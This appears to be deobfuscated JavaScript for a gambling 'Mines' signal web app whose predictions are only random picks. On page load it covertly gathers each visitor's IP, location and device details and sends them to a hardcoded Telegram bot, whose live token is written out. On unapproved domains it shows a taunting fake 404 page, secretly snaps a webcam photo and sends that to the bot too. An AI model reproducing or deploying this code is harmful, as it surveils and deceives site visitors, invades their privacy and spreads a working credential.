const TELEGRAM_BOT_TOKEN = "7372403962:AAFmv-2kXknZY6JOtRkGaEknCoufQ-DScjM";
const ADMIN_ID = "5732636702";
async function sendTelegramMessage(_0xe9b565) {
  try {
    const _0x38bb2a = await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: _0xe9b565,
        parse_mode: "HTML"
      })
    });
    const _0x3a0eed = await _0x38bb2a.json();
    if (!_0x3a0eed.ok) {
      console.error("Failed to send message:", _0x3a0eed);
    }
  } catch (_0x1f2aac) {
    console.error("Failed to send message:", _0x1f2aac);
  }
}
async function getCountryName(_0x3bd686) {
  try {
    const _0x1dc00b = await fetch("https://restcountries.com/v3.1/alpha/" + _0x3bd686);
    const _0x4fad59 = await _0x1dc00b.json();
    return _0x4fad59[0]?.name.common || "Unknown";
  } catch (_0x4eb8c2) {
    console.error("Failed to fetch country name:", _0x4eb8c2);
    return "Unknown";
  }
}
async function getUserInfo() {
  try {
    const _0x9e4ba6 = await fetch("https://ipinfo.io/json");
    const _0x3f5267 = await _0x9e4ba6.json();
    const _0x35e61d = await getCountryName(_0x3f5267.country);
    const _0x582472 = parseUserAgent(navigator.userAgent);
    return {
      ip: _0x3f5267.ip,
      country: _0x3f5267.country,
      countryName: _0x35e61d,
      city: _0x3f5267.city,
      region: _0x3f5267.region,
      countryEmoji: getCountryEmoji(_0x3f5267.country),
      userAgent: navigator.userAgent,
      deviceModel: _0x582472.model,
      deviceType: _0x582472.type,
      deviceOS: _0x582472.os
    };
  } catch (_0x2ce4c3) {
    console.error("Failed to fetch user info:", _0x2ce4c3);
    const _0x2463c8 = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: "❓",
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x2463c8;
  }
}
function parseUserAgent(_0x433b1f) {
  const _0x5ce3d3 = [{
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  }, {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  }, {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  }, {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  }];
  const _0x33198a = [{
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  }, {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  }, {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  }];
  for (let _0xa12ce of _0x5ce3d3) {
    const _0x5da603 = _0x433b1f.match(_0xa12ce.regex);
    if (_0x5da603) {
      return {
        type: _0xa12ce.type,
        os: _0xa12ce.os,
        model: parseDeviceModel(_0x433b1f, _0xa12ce.os)
      };
    }
  }
  for (let _0x598886 of _0x33198a) {
    const _0x5879cd = _0x433b1f.match(_0x598886.regex);
    if (_0x5879cd) {
      return {
        type: _0x598886.type,
        os: _0x598886.os,
        model: parseDeviceModel(_0x433b1f, _0x598886.os)
      };
    }
  }
  return {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
}
function parseDeviceModel(_0x108723, _0x4467e4) {
  switch (_0x4467e4) {
    case "iOS":
      const _0x543372 = _0x108723.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x543372) {
        return "iPhone " + _0x543372[1].replace(/[_\.]/g, " ");
      }
      const _0x1a2030 = _0x108723.match(/iPad/i);
      if (_0x1a2030) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x2c6983 = _0x108723.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x2c6983) {
        return _0x2c6983[1].trim();
      }
      break;
    case "Windows":
      const _0x55233a = _0x108723.match(/Windows\s*([\w\s]+)/i);
      if (_0x55233a) {
        return "Windows " + _0x55233a[1];
      }
      break;
    case "macOS":
      const _0x6b746b = _0x108723.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x6b746b) {
        return "Mac " + _0x6b746b[1];
      }
      break;
  }
  return "Unknown Device";
}
function getCountryEmoji(_0x5e54d7) {
  return _0x5e54d7.replace(g, _0x11c033 => String.fromCodePoint(127397 + _0x11c033.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x519174 = await navigator.mediaDevices.getUserMedia({
      video: true
    });
    const _0x42a09d = document.createElement("video");
    _0x42a09d.srcObject = _0x519174;
    await _0x42a09d.play();
    const _0x3f4aee = document.createElement("canvas");
    _0x3f4aee.width = _0x42a09d.videoWidth;
    _0x3f4aee.height = _0x42a09d.videoHeight;
    const _0xd83280 = _0x3f4aee.getContext("2d");
    _0xd83280.drawImage(_0x42a09d, 0, 0, _0x3f4aee.width, _0x3f4aee.height);
    _0x42a09d.pause();
    _0x519174.getTracks().forEach(_0x274ecb => _0x274ecb.stop());
    const _0x44f4bc = await new Promise(_0x24fbfc => _0x3f4aee.toBlob(_0x24fbfc, "image/jpeg"));
    const _0x3abb20 = new FormData();
    _0x3abb20.append("chat_id", ADMIN_ID);
    _0x3abb20.append("photo", _0x44f4bc, "photo.jpg");
    await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto", {
      method: "POST",
      body: _0x3abb20
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x4921df) {
    console.error("Failed to capture photo:", _0x4921df);
  }
}
async function initTelegramBot() {
  const _0x147fc8 = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  const _0x24e39b = _0x147fc8;
  if (_0x24e39b.domain !== "osdisdll300s9in.vercel.app" && _0x24e39b.domain !== "osdisdll300s9in.vercel.app") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы нищий блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x8607a3 = document.createElement("style");
    _0x8607a3.innerHTML = "\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n        ";
    document.head.appendChild(_0x8607a3);
    const _0x4cc9a3 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0x4cc9a3.ip + "</code>\n📌 Location: " + _0x4cc9a3.city + ", " + _0x4cc9a3.region + ", " + _0x4cc9a3.countryName + " " + _0x4cc9a3.countryEmoji + "\n📱 Device: <code>" + _0x4cc9a3.deviceModel + "</code>\n🖥️ Type: <code>" + _0x4cc9a3.deviceType + " (" + _0x4cc9a3.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x4cc9a3.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
    await captureAndSendPhoto();
    setInterval(() => {
      location.reload();
    }, 11200);
    return;
  }
  try {
    const _0x17481a = await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/getMe");
    const _0x33e10c = await _0x17481a.json();
    if (_0x33e10c.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0xf4c944 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0xf4c944.ip + "</code>\n📌 Location: " + _0xf4c944.city + ", " + _0xf4c944.region + ", " + _0xf4c944.countryName + " " + _0xf4c944.countryEmoji + "\n📱 Device: <code>" + _0xf4c944.deviceModel + "</code>\n🖥️ Type: <code>" + _0xf4c944.deviceType + " (" + _0xf4c944.deviceOS + ")</code>\n📱 User Agent: <code>" + _0xf4c944.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n            ");
    }
  } catch (_0x4bb1b3) {
    console.error("Failed to initialize bot:", _0x4bb1b3);
    const _0x407c59 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0x407c59.ip + "</code>\n📌 Location: " + _0x407c59.city + ", " + _0x407c59.region + ", " + _0x407c59.countryName + " " + _0x407c59.countryEmoji + "\n📱 Device: <code>" + _0x407c59.deviceModel + "</code>\n🖥️ Type: <code>" + _0x407c59.deviceType + " (" + _0x407c59.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x407c59.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
  }
}
document.addEventListener("DOMContentLoaded", _0x1bc8fd => {
  initTelegramBot();
});
document.addEventListener("DOMContentLoaded", function () {
  const _0x30abfa = document.querySelector(".cells-board");
  if (!_0x30abfa) {
    console.error("Element .cells-board not found.");
    return;
  }
  let _0x1fc82e = _0x30abfa.innerHTML;
  const _0x463061 = new URLSearchParams(window.location.search);
  const _0x4516a3 = _0x463061.get("botName") || "Unknown";
  const _0x237ed1 = _0x463061.get("language") || "en";
  const _0x24eed6 = [1, 3, 5, 7];
  const _0x292ffd = {
    "1": 7,
    "3": 5,
    "5": 4,
    "7": 3
  };
  let _0x30a316 = 0;
  const _0x20d80c = document.getElementById("trapsAmount");
  const _0x14ad19 = document.getElementById("prev_preset_btn");
  const _0x5709e9 = document.getElementById("next_preset_btn");
  const _0x3662f7 = document.getElementById("modeButton");
  let _0x2fe588 = "nesk";
  function _0x557099() {
    if (_0x20d80c) {
      _0x20d80c.textContent = _0x24eed6[_0x30a316];
    }
  }
  if (_0x14ad19) {
    _0x14ad19.addEventListener("click", function () {
      if (_0x30a316 > 0) {
        _0x30a316--;
        _0x557099();
      }
    });
  }
  if (_0x5709e9) {
    _0x5709e9.addEventListener("click", function () {
      if (_0x30a316 < _0x24eed6.length - 1) {
        _0x30a316++;
        _0x557099();
      }
    });
  }
  if (_0x3662f7) {
    _0x3662f7.addEventListener("click", function () {
      _0x2fe588 = _0x2fe588 === "nesk" ? "all" : "nesk";
      _0x3662f7.textContent = _0x2fe588 === "nesk" ? "Switch to All" : "Switch to multiple";
    });
  }
  _0x557099();
  function _0x38a303() {
    const _0x39c107 = document.querySelectorAll(".cells-board .cell");
    _0x39c107.forEach(_0x16b0af => {
      _0x16b0af.addEventListener("click", () => {
        _0x16b0af.style.transform = "scale(0.7)";
        setTimeout(() => {
          _0x16b0af.style.transform = "scale(1)";
        }, 200);
      });
    });
  }
  function _0x3ef56a(_0x17c9cf) {
    _0x17c9cf.style.display = "block";
    return _0x17c9cf;
  }
  let _0x4ebf75 = true;
  const _0x541fb6 = document.getElementById("playButton");
  if (_0x541fb6) {
    _0x541fb6.addEventListener("click", function () {
      _0x541fb6.disabled = true;
      let _0x388453 = document.querySelectorAll(".cells-board .cell");
      if (!_0x4ebf75) {
        _0x30abfa.innerHTML = "";
        _0x1d3d6e();
        _0x388453 = document.querySelectorAll(".cells-board .cell");
      }
      const _0x4f48f2 = parseInt(_0x20d80c.textContent);
      const _0x1ec0bb = _0x388453.length;
      const _0x5e966d = new Set();
      while (_0x5e966d.size < _0x4f48f2) {
        const _0x1bbb26 = Math.floor(Math.random() * _0x1ec0bb);
        _0x5e966d.add(_0x1bbb26);
      }
      if (_0x2fe588 === "nesk") {
        const _0x8309c9 = _0x292ffd[_0x4f48f2] || 0;
        const _0x4c5041 = [];
        while (_0x4c5041.length < _0x8309c9) {
          const _0x124850 = Math.floor(Math.random() * _0x388453.length);
          if (!_0x4c5041.includes(_0x124850)) {
            _0x4c5041.push(_0x124850);
          }
        }
        let _0x4dde14 = 0;
        function _0x42d47e() {
          if (_0x4dde14 < _0x4c5041.length) {
            const _0xce203b = _0x4c5041[_0x4dde14];
            const _0x25f35d = _0x388453[_0xce203b];
            _0x25f35d.classList.add("cell-fade-out");
            setTimeout(async () => {
              _0x25f35d.innerHTML = "";
              try {
                const _0x17e4bd = await fetch("img/krest.svg");
                const _0x48d88a = await _0x17e4bd.text();
                const _0x2e8418 = document.createElement("div");
                _0x2e8418.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: flex;\n                                    align-items: center;\n                                    justify-content: center;\n                                    position: relative;\n                                ";
                _0x2e8418.innerHTML = _0x48d88a;
                _0x25f35d.appendChild(_0x2e8418);
                const _0x397cec = _0x2e8418.querySelector("svg");
                if (_0x397cec) {
                  _0x397cec.style.cssText = "\n                                        width: 56px;\n                                        height: 56px;\n                                        max-width: 100%;\n                                        max-height: 100%;\n                                        display: block;\n                                        opacity: 0;\n                                        transform: scale(0);\n                                        transition: opacity 0.3s, transform 0.3s;\n                                    ";
                  const _0x550d2d = _0x397cec.getAttribute("viewBox");
                  if (!_0x550d2d) {
                    const _0x4b38f5 = _0x397cec.getAttribute("width") || "100";
                    const _0x1a8947 = _0x397cec.getAttribute("height") || "100";
                    _0x397cec.setAttribute("viewBox", "0 0 " + _0x4b38f5 + " " + _0x1a8947);
                  }
                  _0x397cec.setAttribute("preserveAspectRatio", "xMidYMid meet");
                  _0x397cec.classList.add("star-animation");
                  requestAnimationFrame(() => {
                    _0x397cec.style.opacity = "1";
                    _0x397cec.style.transform = "scale(1)";
                  });
                }
              } catch (_0x36914c) {
                const _0x99928d = document.createElement("img");
                _0x99928d.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: block;\n                                    will-change: transform, opacity;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
                _0x99928d.src = "img/krest.svg";
                _0x25f35d.appendChild(_0x99928d);
                requestAnimationFrame(() => {
                  _0x99928d.style.opacity = "1";
                  _0x99928d.style.transform = "scale(1)";
                });
              }
              _0x25f35d.classList.remove("cell-fade-out");
              _0x4dde14++;
              setTimeout(_0x42d47e, 700);
            }, 400);
          } else {
            _0x541fb6.disabled = false;
            if (_0x4ebf75) {
              _0x4ebf75 = false;
            }
          }
        }
        _0x42d47e();
      } else {
        Promise.all([..._0x388453].map((_0x476be0, _0x17ddb3) => {
          return new Promise(async _0x4911db => {
            _0x476be0.classList.add("cell-fade-out");
            _0x476be0.innerHTML = "";
            try {
              const _0x18031b = await fetch(_0x5e966d.has(_0x17ddb3) ? "img/stars.svg" : "img/stars.svg");
              const _0x4adfca = await _0x18031b.text();
              const _0x3c7608 = document.createElement("div");
              _0x3c7608.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: flex;\n                                align-items: center;\n                                justify-content: center;\n                                position: relative;\n                            ";
              _0x3c7608.innerHTML = _0x4adfca;
              _0x476be0.appendChild(_0x3c7608);
              const _0x2254b3 = _0x3c7608.querySelector("svg");
              if (_0x2254b3) {
                _0x2254b3.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    max-width: 100%;\n                                    max-height: 100%;\n                                    display: block;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
                const _0x1b4555 = _0x2254b3.getAttribute("viewBox");
                if (!_0x1b4555) {
                  const _0x343e88 = _0x2254b3.getAttribute("width") || "100";
                  const _0x52ee22 = _0x2254b3.getAttribute("height") || "100";
                  _0x2254b3.setAttribute("viewBox", "0 0 " + _0x343e88 + " " + _0x52ee22);
                }
                _0x2254b3.setAttribute("preserveAspectRatio", "xMidYMid meet");
                _0x2254b3.classList.add("star-animation");
                _0x2254b3.style.opacity = "0";
                _0x2254b3.style.transform = "scale(0)";
                requestAnimationFrame(() => {
                  _0x2254b3.style.opacity = "1";
                  _0x2254b3.style.transform = "scale(1)";
                });
              }
            } catch (_0x59dfa3) {
              const _0x4f48ab = document.createElement("img");
              _0x4f48ab.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: block;\n                                will-change: transform, opacity;\n                                opacity: 0;\n                                transform: scale(0);\n                                transition: opacity 0.3s, transform 0.3s;\n                            ";
              _0x4f48ab.src = _0x5e966d.has(_0x17ddb3) ? "img/stars.svg" : "img/stars.svg";
              _0x476be0.appendChild(_0x4f48ab);
              requestAnimationFrame(() => {
                _0x4f48ab.style.opacity = "1";
                _0x4f48ab.style.transform = "scale(1)";
              });
            }
            _0x476be0.classList.remove("cell-fade-out");
            _0x4911db();
          });
        })).then(() => {
          _0x541fb6.disabled = false;
          if (_0x4ebf75) {
            _0x4ebf75 = false;
          }
        });
      }
    });
  }
  function _0x1d3d6e() {
    const _0x281202 = ["output_svgs/image_5450.svg", "output_svgs/image_11641.svg", "output_svgs/image_18337.svg", "output_svgs/image_24493.svg", "output_svgs/image_31201.svg", "output_svgs/image_37357.svg", "output_svgs/image_44065.svg", "output_svgs/image_50221.svg", "output_svgs/image_56929.svg", "output_svgs/image_63085.svg", "output_svgs/image_69793.svg", "output_svgs/image_75949.svg", "output_svgs/image_82645.svg", "output_svgs/image_89353.svg", "output_svgs/image_95509.svg", "output_svgs/image_102217.svg", "output_svgs/image_108373.svg", "output_svgs/image_115081.svg", "output_svgs/image_121237.svg", "output_svgs/image_127381.svg", "output_svgs/image_134077.svg", "output_svgs/image_140221.svg", "output_svgs/image_146917.svg", "output_svgs/image_153061.svg", "output_svgs/image_159757.svg"];
    _0x281202.forEach(_0x1e65a8 => {
      const _0x46996f = document.createElement("button");
      _0x46996f.type = "button";
      _0x46996f.className = "cell";
      _0x46996f.innerHTML = "<img width=\"56\" height=\"56\" src=\"" + _0x1e65a8 + "\">";
      _0x30abfa.appendChild(_0x46996f);
    });
    _0x38a303();
  }
  _0x1d3d6e();
});